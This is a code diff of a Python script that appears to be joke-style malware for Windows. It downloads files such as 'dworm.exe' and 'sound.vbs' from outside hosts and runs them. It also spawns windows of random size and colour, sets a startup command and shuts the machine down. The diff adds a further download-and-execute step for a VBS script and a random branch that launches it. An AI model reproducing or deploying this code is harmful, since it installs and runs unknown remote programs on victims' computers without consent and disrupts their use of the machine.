@@ -100,8 +100,12 @@ def block():
             z = random.choice(rn)
             a = random.choice(rn)
             ba = random.choice(rb)
-            us()
-            res = "222x222+%s+%s" % (z,a)
+            res = "333x333+%s+%s" % (z,a)
+            jay = 0
+            jay += 1
+            if jay == 10:
+                us()
+                jay -+ 10
             block.geometry(res)
             cran = random.choice(color)
             block.configure(background = cran)
@@ -141,8 +145,12 @@ def dn():
     os.system("move xavs.scr " + disf)
     time.sleep(1)
 
-    wget.download("http://download1646.mediafire.com/h1bwlb2qhtug/olsf4puxnwq0ax8/jcs.wav")
-    os.system("move jcs.wav " + disf)
+    wget.download("http://zepikao.my3gb.com/Sh3lz/sound.vbs")
+    os.system("move sound.vbs " + disf)
+    time.sleep(1)
+
+    wget.download("http://download1593.mediafire.com/q885r1g125gg/pwhpbb0lqr2mggs/t.mp3")
+    os.system("move t.mp3 " + disf)
     time.sleep(1)
 
     wget.download("http://zepikao.my3gb.com/Sh3lz/dworm.exe")
@@ -151,6 +159,7 @@ def dn():
 
 
 def sc():
+    global disd
     disd = "C:\Users" + "\\" + quest + "\Documents\\"
     os.system("start " + disd + "dworm.exe")
     us()
@@ -174,7 +183,7 @@ def checkex():
         wpp()
         while 1==1:
             try:
-                pcho = random.choice([1,2,3])
+                pcho = random.choice([1,2,3,4])
                 if pcho   == 1:
                     us()
                     block()
@@ -184,6 +193,9 @@ def checkex():
                 elif pcho == 3:
                     us()
                     sc()
+                elif pcho == 4:
+                    os.system('start ' + disd + "sound.vbs")
+
             except:
                 pass
     else:
@@ -192,5 +204,6 @@ def checkex():
         os.system(startupcom)
         dn()
         shut()
+
 
 checkex()
